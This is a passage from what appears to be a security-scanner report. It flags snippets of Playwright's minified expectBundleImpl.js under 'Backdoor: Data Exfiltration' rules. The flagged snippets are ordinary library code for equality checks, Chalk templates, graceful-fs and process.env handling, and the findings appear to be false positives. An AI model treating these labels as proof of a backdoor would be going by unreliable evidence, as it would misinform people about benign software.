                    "text": ".includes(n)}forEach(t){if(this.type===\"object\"){let r=Object.getOwnPropertyDescriptors(this.object);[...Object.keys(r),...Object.getOwnPropertySymbols(r)].filter(n=>r[n].enumerable).forEach(n=>{t(this.object[n],n,this.object)})}else this.object.forEach(t)}get(t){return this.type===\"map\"?this.object.get(t):this.object[t]}set(t,r){this.type===\"map\"?this.object.set(t,r):this.object[t]=r}};Gn.default=Oi});var kc=R(Si=>{\"use strict\";Object.defineProperty(Si,\"__esModule\",{value:!0});Si.default=Kn;var Og=qr(),jc=[Array,Date,Float32Array,Float64Array,Int16Array,Int32Array,Int8Array,Map,Set,RegExp,Uint16Ar",
                    "rendered": {
                      "text": ".includes(n)}forEach(t){if(this.type===\"object\"){let r=Object.getOwnPropertyDescriptors(this.object);[...Object.keys(r),...Object.getOwnPropertySymbols(r)].filter(n=>r[n].enumerable).forEach(n=>{t(this.object[n],n,this.object)})}else this.object.forEach(t)}get(t){return this.type===\"map\"?this.object.get(t):this.object[t]}set(t,r){this.type===\"map\"?this.object.set(t,r):this.object[t]=r}};Gn.default=Oi});var kc=R(Si=>{\"use strict\";Object.defineProperty(Si,\"__esModule\",{value:!0});Si.default=Kn;var Og=qr(),jc=[Array,Date,Float32Array,Float64Array,Int16Array,Int32Array,Int8Array,Map,Set,RegExp,Uint16Ar",
                      "markdown": "`.includes(n)}forEach(t){if(this.type===\"object\"){let r=Object.getOwnPropertyDescriptors(this.object);[...Object.keys(r),...Object.getOwnPropertySymbols(r)].filter(n=>r[n].enumerable).forEach(n=>{t(this.object[n],n,this.object)})}else this.object.forEach(t)}get(t){return this.type===\"map\"?this.object.get(t):this.object[t]}set(t,r){this.type===\"map\"?this.object.set(t,r):this.object[t]=r}};Gn.default=Oi});var kc=R(Si=>{\"use strict\";Object.defineProperty(Si,\"__esModule\",{value:!0});Si.default=Kn;var Og=qr(),jc=[Array,Date,Float32Array,Float64Array,Int16Array,Int32Array,Int8Array,Map,Set,RegExp,Uint16Ar`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 8455,
                  "endLine": 7,
                  "endColumn": 8460,
                  "snippet": {
                    "text": "(Ia()),Fn=Sn();function La(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(La=function(n){return n?r:t})(e)}function t1(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=La(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var xa=(e,t=[",
                    "rendered": {
                      "text": "(Ia()),Fn=Sn();function La(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(La=function(n){return n?r:t})(e)}function t1(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=La(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var xa=(e,t=[",
                      "markdown": "`(Ia()),Fn=Sn();function La(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(La=function(n){return n?r:t})(e)}function t1(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=La(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var xa=(e,t=[`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 2764,
                  "endLine": 7,
                  "endColumn": 2769,
                  "snippet": {
                    "text": "=\"@@__IMMUTABLE_STACK__@@\",tr=e=>`Immutable.${e}`,An=e=>`[${e}]`,jr=\" \",Oa=\"\\u2026\",Vd=(e,t,r,n,s,i,u)=>++n>t.maxDepth?An(tr(u)):`${tr(u)+jr}{${(0,Br.printIteratorEntries)(e.entries(),t,r,n,s,i)}}`;function zd(e){let t=0;return{next(){if(t<e._keys.length){let r=e._keys[t++];return{done:!1,value:[r,e.get(r)]}}return{done:!0,value:void 0}}}}var Yd=(e,t,r,n,s,i)=>{let u=tr(e._name||\"Record\");return++n>t.maxDepth?An(u):`${u+jr}{${(0,Br.printIteratorEntries)(zd(e),t,r,n,s,i)}}`},Xd=(e,t,r,n,s,i)=>{let u=tr(\"Seq\");return++n>t.maxDepth?An(u):e[qd]?`${u+jr}{${e._iter||e._object?(0,Br.printIteratorEntries)(",
                    "rendered": {
                      "text": "=\"@@__IMMUTABLE_STACK__@@\",tr=e=>`Immutable.${e}`,An=e=>`[${e}]`,jr=\" \",Oa=\"\\u2026\",Vd=(e,t,r,n,s,i,u)=>++n>t.maxDepth?An(tr(u)):`${tr(u)+jr}{${(0,Br.printIteratorEntries)(e.entries(),t,r,n,s,i)}}`;function zd(e){let t=0;return{next(){if(t<e._keys.length){let r=e._keys[t++];return{done:!1,value:[r,e.get(r)]}}return{done:!0,value:void 0}}}}var Yd=(e,t,r,n,s,i)=>{let u=tr(e._name||\"Record\");return++n>t.maxDepth?An(u):`${u+jr}{${(0,Br.printIteratorEntries)(zd(e),t,r,n,s,i)}}`},Xd=(e,t,r,n,s,i)=>{let u=tr(\"Seq\");return++n>t.maxDepth?An(u):e[qd]?`${u+jr}{${e._iter||e._object?(0,Br.printIteratorEntries)(",
                      "markdown": "`=\"@@__IMMUTABLE_STACK__@@\",tr=e=>`Immutable.${e}`,An=e=>`[${e}]`,jr=\" \",Oa=\"\\u2026\",Vd=(e,t,r,n,s,i,u)=>++n>t.maxDepth?An(tr(u)):`${tr(u)+jr}{${(0,Br.printIteratorEntries)(e.entries(),t,r,n,s,i)}}`;function zd(e){let t=0;return{next(){if(t<e._keys.length){let r=e._keys[t++];return{done:!1,value:[r,e.get(r)]}}return{done:!0,value:void 0}}}}var Yd=(e,t,r,n,s,i)=>{let u=tr(e._name||\"Record\");return++n>t.maxDepth?An(u):`${u+jr}{${(0,Br.printIteratorEntries)(zd(e),t,r,n,s,i)}}`},Xd=(e,t,r,n,s,i)=>{let u=tr(\"Seq\");return++n>t.maxDepth?An(u):e[qd]?`${u+jr}{${e._iter||e._object?(0,Br.printIteratorEntries)(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 307,
                  "endLine": 5,
                  "endColumn": 312,
                  "snippet": {
                    "text": ",\"\\r\"],[\"t\",\"\t\"],[\"b\",\"\\b\"],[\"f\",\"\\f\"],[\"v\",\"\\v\"],[\"0\",\"\\0\"],[\"\\\\\",\"\\\\\"],[\"e\",\"\\x1B\"],[\"a\",\"\\x07\"]]);function Ko(e){let t=e[0]===\"u\",r=e[1]===\"{\";return t&&!r&&e.length===5||e[0]===\"x\"&&e.length===3?String.fromCharCode(parseInt(e.slice(1),16)):t&&r?String.fromCodePoint(parseInt(e.slice(2,-1),16)):rd.get(e)||e}function nd(e,t){let r=[],n=t.trim().split(/\\s*,\\s*/g),s;for(let i of n){let u=Number(i);if(!Number.isNaN(u))r.push(u);else if(s=i.match(ed))r.push(s[2].replace(td,(o,a,l)=>a?Ko(a):l));else throw new Error(`Invalid Chalk template style argument: ${i} (in style '${e}')`)}return r}function sd(e)",
                    "rendered": {
                      "text": ",\"\\r\"],[\"t\",\"\t\"],[\"b\",\"\\b\"],[\"f\",\"\\f\"],[\"v\",\"\\v\"],[\"0\",\"\\0\"],[\"\\\\\",\"\\\\\"],[\"e\",\"\\x1B\"],[\"a\",\"\\x07\"]]);function Ko(e){let t=e[0]===\"u\",r=e[1]===\"{\";return t&&!r&&e.length===5||e[0]===\"x\"&&e.length===3?String.fromCharCode(parseInt(e.slice(1),16)):t&&r?String.fromCodePoint(parseInt(e.slice(2,-1),16)):rd.get(e)||e}function nd(e,t){let r=[],n=t.trim().split(/\\s*,\\s*/g),s;for(let i of n){let u=Number(i);if(!Number.isNaN(u))r.push(u);else if(s=i.match(ed))r.push(s[2].replace(td,(o,a,l)=>a?Ko(a):l));else throw new Error(`Invalid Chalk template style argument: ${i} (in style '${e}')`)}return r}function sd(e)",
                      "markdown": "`,\"\\r\"],[\"t\",\"\t\"],[\"b\",\"\\b\"],[\"f\",\"\\f\"],[\"v\",\"\\v\"],[\"0\",\"\\0\"],[\"\\\\\",\"\\\\\"],[\"e\",\"\\x1B\"],[\"a\",\"\\x07\"]]);function Ko(e){let t=e[0]===\"u\",r=e[1]===\"{\";return t&&!r&&e.length===5||e[0]===\"x\"&&e.length===3?String.fromCharCode(parseInt(e.slice(1),16)):t&&r?String.fromCodePoint(parseInt(e.slice(2,-1),16)):rd.get(e)||e}function nd(e,t){let r=[],n=t.trim().split(/\\s*,\\s*/g),s;for(let i of n){let u=Number(i);if(!Number.isNaN(u))r.push(u);else if(s=i.match(ed))r.push(s[2].replace(td,(o,a,l)=>a?Ko(a):l));else throw new Error(`Invalid Chalk template style argument: ${i} (in style '${e}')`)}return r}function sd(e)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 6552,
                  "endLine": 1,
                  "endColumn": 6557,
                  "snippet": {
                    "text": "sImmutableUnorderedSet)(e)){let l=!0;for(let c of e)if(!t.has(c)){let f=!1;for(let p of t)(0,we.equals)(c,p,o)===!0&&(f=!0);if(f===!1){l=!1;break}}return n.pop(),s.pop(),l}else if((0,we.isA)(\"Map\",e)||(0,Kt.isImmutableUnorderedKeyed)(e)){let l=!0;for(let c of e)if(!t.has(c[0])||!(0,we.equals)(c[1],t.get(c[0]),o)){let f=!1;for(let p of t){let d=(0,we.equals)(c[0],p[0],o),h=!1;d===!0&&(h=(0,we.equals)(c[1],p[1],o)),h===!0&&(f=!0)}if(f===!1){l=!1;break}}return n.pop(),s.pop(),l}}let a=t[Eo]();for(let l of e){let c=a.next();if(c.done||!(0,we.equals)(l,c.value,o))return!1}if(!a.next().done)return!1;if(!",
                    "rendered": {
                      "text": "sImmutableUnorderedSet)(e)){let l=!0;for(let c of e)if(!t.has(c)){let f=!1;for(let p of t)(0,we.equals)(c,p,o)===!0&&(f=!0);if(f===!1){l=!1;break}}return n.pop(),s.pop(),l}else if((0,we.isA)(\"Map\",e)||(0,Kt.isImmutableUnorderedKeyed)(e)){let l=!0;for(let c of e)if(!t.has(c[0])||!(0,we.equals)(c[1],t.get(c[0]),o)){let f=!1;for(let p of t){let d=(0,we.equals)(c[0],p[0],o),h=!1;d===!0&&(h=(0,we.equals)(c[1],p[1],o)),h===!0&&(f=!0)}if(f===!1){l=!1;break}}return n.pop(),s.pop(),l}}let a=t[Eo]();for(let l of e){let c=a.next();if(c.done||!(0,we.equals)(l,c.value,o))return!1}if(!a.next().done)return!1;if(!",
                      "markdown": "`sImmutableUnorderedSet)(e)){let l=!0;for(let c of e)if(!t.has(c)){let f=!1;for(let p of t)(0,we.equals)(c,p,o)===!0&&(f=!0);if(f===!1){l=!1;break}}return n.pop(),s.pop(),l}else if((0,we.isA)(\"Map\",e)||(0,Kt.isImmutableUnorderedKeyed)(e)){let l=!0;for(let c of e)if(!t.has(c[0])||!(0,we.equals)(c[1],t.get(c[0]),o)){let f=!1;for(let p of t){let d=(0,we.equals)(c[0],p[0],o),h=!1;d===!0&&(h=(0,we.equals)(c[1],p[1],o)),h===!0&&(f=!0)}if(f===!1){l=!1;break}}return n.pop(),s.pop(),l}}let a=t[Eo]();for(let l of e){let c=a.next();if(c.done||!(0,we.equals)(l,c.value,o))return!1}if(!a.next().done)return!1;if(!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 5729,
                  "endLine": 1,
                  "endColumn": 5734,
                  "snippet": {
                    "text": "Bs=(e,t,r=[],n=new WeakMap)=>{if(Array.isArray(e)){if(Array.isArray(t)&&t.length===e.length)return t.map((s,i)=>Bs(e[i],s,r))}else{if(e instanceof Date)return e;if(js(e)&&js(t)){if((0,we.equals)(e,t,[...r,yn,qs]))return t;let s={};if(n.set(e,s),Fs(e).filter(i=>ks(t,i)).forEach(i=>{s[i]=n.has(e[i])?n.get(e[i]):Bs(e[i],t[i],r,n)}),Fs(s).length>0)return s}}return e};Z.getObjectSubset=Bs;var Eo=Ih.iterator,ho=e=>!!(e!=null&&e[Eo]),yn=(e,t,r=[],n=[],s=[])=>{if(typeof e!=\"object\"||typeof t!=\"object\"||Array.isArray(e)||Array.isArray(t)||!ho(e)||!ho(t))return;if(e.constructor!==t.constructor)return!1;let i",
                    "rendered": {
                      "text": "Bs=(e,t,r=[],n=new WeakMap)=>{if(Array.isArray(e)){if(Array.isArray(t)&&t.length===e.length)return t.map((s,i)=>Bs(e[i],s,r))}else{if(e instanceof Date)return e;if(js(e)&&js(t)){if((0,we.equals)(e,t,[...r,yn,qs]))return t;let s={};if(n.set(e,s),Fs(e).filter(i=>ks(t,i)).forEach(i=>{s[i]=n.has(e[i])?n.get(e[i]):Bs(e[i],t[i],r,n)}),Fs(s).length>0)return s}}return e};Z.getObjectSubset=Bs;var Eo=Ih.iterator,ho=e=>!!(e!=null&&e[Eo]),yn=(e,t,r=[],n=[],s=[])=>{if(typeof e!=\"object\"||typeof t!=\"object\"||Array.isArray(e)||Array.isArray(t)||!ho(e)||!ho(t))return;if(e.constructor!==t.constructor)return!1;let i",
                      "markdown": "`Bs=(e,t,r=[],n=new WeakMap)=>{if(Array.isArray(e)){if(Array.isArray(t)&&t.length===e.length)return t.map((s,i)=>Bs(e[i],s,r))}else{if(e instanceof Date)return e;if(js(e)&&js(t)){if((0,we.equals)(e,t,[...r,yn,qs]))return t;let s={};if(n.set(e,s),Fs(e).filter(i=>ks(t,i)).forEach(i=>{s[i]=n.has(e[i])?n.get(e[i]):Bs(e[i],t[i],r,n)}),Fs(s).length>0)return s}}return e};Z.getObjectSubset=Bs;var Eo=Ih.iterator,ho=e=>!!(e!=null&&e[Eo]),yn=(e,t,r=[],n=[],s=[])=>{if(typeof e!=\"object\"||typeof t!=\"object\"||Array.isArray(e)||Array.isArray(t)||!ho(e)||!ho(t))return;if(e.constructor!==t.constructor)return!1;let i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 258,
                  "startColumn": 1541,
                  "endLine": 258,
                  "endColumn": 1552,
                  "snippet": {
                    "text": "p()}else s.push(c)}),n.push(s.join(\"\")),r.length>0){let i=`Chalk template literal is missing ${r.length} closing bracket${r.length===1?\"\":\"s\"} (\\`}\\`)`;throw new Error(i)}return n.join(\"\")}});var _0=R((j_,pn)=>{\"use strict\";var ju=Yf(),ae=o0(),Bu=f0().stdout,ib=m0(),E0=process.platform===\"win32\"&&!(process.env.TERM||\"\").toLowerCase().startsWith(\"xterm\"),b0=[\"ansi\",\"ansi\",\"ansi256\",\"ansi16m\"],v0=new Set([\"gray\"]),Cr=Object.create(null);function y0(e,t){t=t||{};let r=Bu?Bu.level:0;e.level=t.level===void 0?r:t.level,e.enabled=\"enabled\"in t?t.enabled:e.level>0}function fn(e){if(!this||!(this instanceof fn)||",
                    "rendered": {
                      "text": "p()}else s.push(c)}),n.push(s.join(\"\")),r.length>0){let i=`Chalk template literal is missing ${r.length} closing bracket${r.length===1?\"\":\"s\"} (\\`}\\`)`;throw new Error(i)}return n.join(\"\")}});var _0=R((j_,pn)=>{\"use strict\";var ju=Yf(),ae=o0(),Bu=f0().stdout,ib=m0(),E0=process.platform===\"win32\"&&!(process.env.TERM||\"\").toLowerCase().startsWith(\"xterm\"),b0=[\"ansi\",\"ansi\",\"ansi256\",\"ansi16m\"],v0=new Set([\"gray\"]),Cr=Object.create(null);function y0(e,t){t=t||{};let r=Bu?Bu.level:0;e.level=t.level===void 0?r:t.level,e.enabled=\"enabled\"in t?t.enabled:e.level>0}function fn(e){if(!this||!(this instanceof fn)||",
                      "markdown": "`p()}else s.push(c)}),n.push(s.join(\"\")),r.length>0){let i=`Chalk template literal is missing ${r.length} closing bracket${r.length===1?\"\":\"s\"} (\\`}\\`)`;throw new Error(i)}return n.join(\"\")}});var _0=R((j_,pn)=>{\"use strict\";var ju=Yf(),ae=o0(),Bu=f0().stdout,ib=m0(),E0=process.platform===\"win32\"&&!(process.env.TERM||\"\").toLowerCase().startsWith(\"xterm\"),b0=[\"ansi\",\"ansi\",\"ansi256\",\"ansi16m\"],v0=new Set([\"gray\"]),Cr=Object.create(null);function y0(e,t){t=t||{};let r=Bu?Bu.level:0;e.level=t.level===void 0?r:t.level,e.enabled=\"enabled\"in t?t.enabled:e.level>0}function fn(e){if(!this||!(this instanceof fn)||`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 7438,
                  "endLine": 46,
                  "endColumn": 7449,
                  "snippet": {
                    "text": "return delete e[a],delete t[a],!0}function s(o,a){return e[a]}function i(o,a){return typeof a==\"string\"?t[a in Cl?a:a.toLowerCase()]:e[a]}let u=new Proxy(e,{deleteProperty:Rl?r:n,get:Rl?i:s,set(o,a,l){let c=`${l}`;return typeof a==\"string\"&&(t[a.toLowerCase()]=c),e[a]=c,!0}});return Object.assign(u,process.env)}function Rm(){let e=require(\"process\"),t=(0,Em.default)(e,{blacklist:vm,keepPrototype:!0});try{t[Symbol.toStringTag]=\"process\"}catch(n){if(t[Symbol.toStringTag]!==\"process\")throw n.message=`Unable to set toStringTag on process. Please open up an issue at https://github.com/facebook/jest\n\n${n.messa",
                    "rendered": {
                      "text": "return delete e[a],delete t[a],!0}function s(o,a){return e[a]}function i(o,a){return typeof a==\"string\"?t[a in Cl?a:a.toLowerCase()]:e[a]}let u=new Proxy(e,{deleteProperty:Rl?r:n,get:Rl?i:s,set(o,a,l){let c=`${l}`;return typeof a==\"string\"&&(t[a.toLowerCase()]=c),e[a]=c,!0}});return Object.assign(u,process.env)}function Rm(){let e=require(\"process\"),t=(0,Em.default)(e,{blacklist:vm,keepPrototype:!0});try{t[Symbol.toStringTag]=\"process\"}catch(n){if(t[Symbol.toStringTag]!==\"process\")throw n.message=`Unable to set toStringTag on process. Please open up an issue at https://github.com/facebook/jest\n\n${n.messa",
                      "markdown": "`return delete e[a],delete t[a],!0}function s(o,a){return e[a]}function i(o,a){return typeof a==\"string\"?t[a in Cl?a:a.toLowerCase()]:e[a]}let u=new Proxy(e,{deleteProperty:Rl?r:n,get:Rl?i:s,set(o,a,l){let c=`${l}`;return typeof a==\"string\"&&(t[a.toLowerCase()]=c),e[a]=c,!0}});return Object.assign(u,process.env)}function Rm(){let e=require(\"process\"),t=(0,Em.default)(e,{blacklist:vm,keepPrototype:!0});try{t[Symbol.toStringTag]=\"process\"}catch(n){if(t[Symbol.toStringTag]!==\"process\")throw n.message=`Unable to set toStringTag on process. Please open up an issue at https://github.com/facebook/jest\n\n${n.messa`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 6854,
                  "endLine": 46,
                  "endColumn": 6865,
                  "snippet": {
                    "text": "totype:t.keepPrototype},r);return n}});var Ol=R(Ui=>{\"use strict\";Object.defineProperty(Ui,\"__esModule\",{value:!0});Ui.default=Rm;var Em=bm(ns());function bm(e){return e&&e.__esModule?e:{default:e}}var vm=new Set([\"env\",\"mainModule\",\"_events\"]),Rl=process.platform===\"win32\",Cl=Object.getPrototypeOf(process.env);function _m(){let e=Object.create(Cl),t={};function r(o,a){for(let l in e)Object.prototype.hasOwnProperty.call(e,l)&&(typeof a==\"string\"?l.toLowerCase()===a.toLowerCase()&&(delete e[l],delete t[l.toLowerCase()]):a===l&&(delete e[l],delete t[l]));return!0}function n(o,a){return delete e[a],delete t",
                    "rendered": {
                      "text": "totype:t.keepPrototype},r);return n}});var Ol=R(Ui=>{\"use strict\";Object.defineProperty(Ui,\"__esModule\",{value:!0});Ui.default=Rm;var Em=bm(ns());function bm(e){return e&&e.__esModule?e:{default:e}}var vm=new Set([\"env\",\"mainModule\",\"_events\"]),Rl=process.platform===\"win32\",Cl=Object.getPrototypeOf(process.env);function _m(){let e=Object.create(Cl),t={};function r(o,a){for(let l in e)Object.prototype.hasOwnProperty.call(e,l)&&(typeof a==\"string\"?l.toLowerCase()===a.toLowerCase()&&(delete e[l],delete t[l.toLowerCase()]):a===l&&(delete e[l],delete t[l]));return!0}function n(o,a){return delete e[a],delete t",
                      "markdown": "`totype:t.keepPrototype},r);return n}});var Ol=R(Ui=>{\"use strict\";Object.defineProperty(Ui,\"__esModule\",{value:!0});Ui.default=Rm;var Em=bm(ns());function bm(e){return e&&e.__esModule?e:{default:e}}var vm=new Set([\"env\",\"mainModule\",\"_events\"]),Rl=process.platform===\"win32\",Cl=Object.getPrototypeOf(process.env);function _m(){let e=Object.create(Cl),t={};function r(o,a){for(let l in e)Object.prototype.hasOwnProperty.call(e,l)&&(typeof a==\"string\"?l.toLowerCase()===a.toLowerCase()&&(delete e[l],delete t[l.toLowerCase()]):a===l&&(delete e[l],delete t[l]));return!0}function n(o,a){return delete e[a],delete t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 564,
                  "endLine": 46,
                  "endColumn": 575,
                  "snippet": {
                    "text": "tion(e){function t(r){e.apply(re,arguments),ml()}return Object.defineProperty(t,ts,{value:e}),t}(re.closeSync),/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&process.on(\"exit\",function(){Pt(re[ge]),require(\"assert\").equal(re[ge].length,0)}));var gl;global[ge]||yl(global,re[ge]);Fi.exports=Pi(pm(re));process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH&&!re.__patched&&(Fi.exports=Pi(re),re.__patched=!0);function Pi(e){lm(e),e.gracefulify=Pi,e.createReadStream=M,e.createWriteStream=k;var t=e.readFile;e.readFile=r;function r(O,L,y){return typeof L==\"function\"&&(y=L,L=null),B(O,L,y);function B(D,G,E,b){return t(D,G,func",
                    "rendered": {
                      "text": "tion(e){function t(r){e.apply(re,arguments),ml()}return Object.defineProperty(t,ts,{value:e}),t}(re.closeSync),/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&process.on(\"exit\",function(){Pt(re[ge]),require(\"assert\").equal(re[ge].length,0)}));var gl;global[ge]||yl(global,re[ge]);Fi.exports=Pi(pm(re));process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH&&!re.__patched&&(Fi.exports=Pi(re),re.__patched=!0);function Pi(e){lm(e),e.gracefulify=Pi,e.createReadStream=M,e.createWriteStream=k;var t=e.readFile;e.readFile=r;function r(O,L,y){return typeof L==\"function\"&&(y=L,L=null),B(O,L,y);function B(D,G,E,b){return t(D,G,func",
                      "markdown": "`tion(e){function t(r){e.apply(re,arguments),ml()}return Object.defineProperty(t,ts,{value:e}),t}(re.closeSync),/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&process.on(\"exit\",function(){Pt(re[ge]),require(\"assert\").equal(re[ge].length,0)}));var gl;global[ge]||yl(global,re[ge]);Fi.exports=Pi(pm(re));process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH&&!re.__patched&&(Fi.exports=Pi(re),re.__patched=!0);function Pi(e){lm(e),e.gracefulify=Pi,e.createReadStream=M,e.createWriteStream=k;var t=e.readFile;e.readFile=r;function r(O,L,y){return typeof L==\"function\"&&(y=L,L=null),B(O,L,y);function B(D,G,E,b){return t(D,G,func`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 392,
                  "endLine": 46,
                  "endColumn": 403,
                  "snippet": {
                    "text": "on t(r,n){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Object.defineProperty(t,ts,{value:e}),t}(re.close),re.closeSync=function(e){function t(r){e.apply(re,arguments),ml()}return Object.defineProperty(t,ts,{value:e}),t}(re.closeSync),/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&process.on(\"exit\",function(){Pt(re[ge]),require(\"assert\").equal(re[ge].length,0)}));var gl;global[ge]||yl(global,re[ge]);Fi.exports=Pi(pm(re));process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH&&!re.__patched&&(Fi.exports=Pi(re),re.__patched=!0);function Pi(e){lm(e),e.gracefulify=Pi,e.creat",
                    "rendered": {
